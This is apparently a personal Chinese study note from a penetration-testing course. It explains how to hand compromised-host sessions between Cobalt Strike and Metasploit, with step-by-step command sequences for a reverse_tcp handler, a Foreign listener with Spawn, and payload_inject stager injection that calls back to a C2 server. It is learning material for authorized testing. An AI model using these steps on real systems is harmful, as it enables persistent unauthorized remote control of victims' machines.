# 2026-09-02 内网安全（CS 联动补充）：MSF & CobaltStrike 联动 Shell

> 状态：🧪 理论（课程截图），待实操
> 承接 09-01 内网安全⑤（Cobalt Strike 一把梭哈基础）：⑤ 只用了 CS 单边（监听器→上线→提权→渗透），本小节补 **CS 与 MSF 双向"会话转手"**——CS 的 beacon 会话交给 MSF 继续打（CS→MSF），或 MSF 拿到的会话注回 CS 统一管理（MSF→CS）。
> 来源课程案例：#案例1-MSF&CobaltStrike联动Shell（属于 CS 相关课的小节，与 09-02 隧道课同天学习，主题独立故单开一篇）

## 一、一句话认知

**CS↔MSF 联动** = 把 CS 的 beacon 会话和 MSF 的 meterpreter 会话**互相派生/转交**，让两边工具链优势互补（MSF 后渗透模块多、CS 内网渗透/免杀/团队协作强），解决"会话只在一边、另一边用不上"的问题。核心机制：**谁接收谁先开监听**，发送方用 stager 派生一个新会话连过去。

## 二、课程原话（截图全文）

```
#案例1-MSF&CobaltStrike联动Shell

CS->MSF
创建Foreign监听器->MSF监听模块设置对应地址端口->CS执行Spawn选择监听器

MSF->CS
CS创建监听器->MSF载入新模块注入设置对应地址端口->执行CS等待上线

use exploit/windows/local/payload_inject
```

## 三、两条链路的展开理解（⭐ 标准用法补充，细节待对照课程视频）

### CS → MSF（beacon 派生 meterpreter 交给 MSF）

```
1. MSF 先开接收端：use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set lhost <MSF 机器 IP> / set lport <端口>
   run（挂起等待）
2. CS 建 Foreign 监听器：Listeners → Add → Payload 选 windows/foreign/reverse_tcp，
   地址端口填与 MSF handler 一致的 IP/端口
3. 在已上线的 beacon 上执行 Spawn（右键会话 → Spawn，或 beacon> spawn），选择刚建的 Foreign 监听器
   → beacon 派生一个子进程注入 stager 连回 MSF
4. MSF 侧 getsession 拿到 meterpreter，后续用 MSF 模块继续打
```

要点：**Foreign（外联）监听器** = CS 用来把会话"交出去"的出口，payload 是 foreign 类型（不是自家 beacon），方向是从 CS 会话往外连 MSF。

### MSF → CS（MSF 会话注回 CS）

```
1. CS 先建接收监听器（常规类型，如 HTTP/DNS，地址端口 = CS 服务器）
2. MSF 已有一个会话的前提下：use exploit/windows/local/payload_inject   ← 课程命令
   set session <已有会话 ID>
   set payload windows/meterpreter/reverse_http   （与 CS 监听器类型对应）
   set lhost <CS 服务器 IP> / set lport <CS 监听端口>
   run
3. payload_inject 把指向 CS 监听器的 stager 注入目标进程并执行 → 回连 CS → CS 等待上线
```

要点：payload_inject 是**本地提权目录下的注入模块**（exploit/windows/local/），作用不是提权而是"往当前会话进程里塞一个指定 payload 的 stager"，借此把会话"寄"到 CS 去。

**选型直觉**（我的理解，❓ 待对照）：CS 会话想用 MSF 的漏洞利用/aux 模块 → CS→MSF；MSF 打的机器想让团队在 CS 里统一看/联动内网 → MSF→CS。

## 四、疑问

1. ❓ Foreign 监听器的 payload 类型（windows/foreign/reverse_tcp）与 MSF handler 的 payload 必须怎么配对？（foreign 派生出的 meterpreter 与标准 reverse_tcp 是否同构、端口是否必须一致）
2. ❓ payload_inject 默认注入到哪个进程（当前进程/可指定 PID）？注入后原 MSF 会话还在吗，双会话并存有什么坑（被杀软查内存特征/流量双通道）？
3. ❓ 实战中 CS↔MSF 互转的典型触发场景？（各自优势到底在哪一步体现）

## 关联笔记

- [2026-09-01-内网安全-域横向移动SPN-Kerberoast与CobaltStrike-RDP.md](./2026-09-01-内网安全-域横向移动SPN-Kerberoast与CobaltStrike-RDP.md) — CS 基础使用（监听器/上线/提权），本小节的"创建监听器/Spawn"建立在其上
- [2026-09-02-内网安全-域横向隧道技术网络层传输层应用层.md](./2026-09-02-内网安全-域横向隧道技术网络层传输层应用层.md) — 同天另一课（隧道技术案例5 也是 CS DNS 监听器场景），CS 监听器/上线知识两处复用
- [2026-08-31-内网安全-域横向移动PTH-PTK-PTT哈希票据传递.md](./2026-08-31-内网安全-域横向移动PTH-PTK-PTT哈希票据传递.md) — 拿到会话后的凭据/票据操作（MSF/CS 会话里都能做）

## 待实践

- 有 CS + MSF 授权环境时：先把 CS→MSF 链路跑通（Foreign 监听器 + Spawn + MSF getsession），再跑 MSF→CS（payload_inject 注入回连），记录两边的会话状态与杀软反应
- 对照官方文档/课程视频补全：Foreign 监听器支持哪些 payload；payload_inject 各选项（PID/进程迁移）

> ⚠️ 声明：仅限授权环境（靶场/CTF/授权渗透）中测试，所有 Payload 只用于验证漏洞存在。
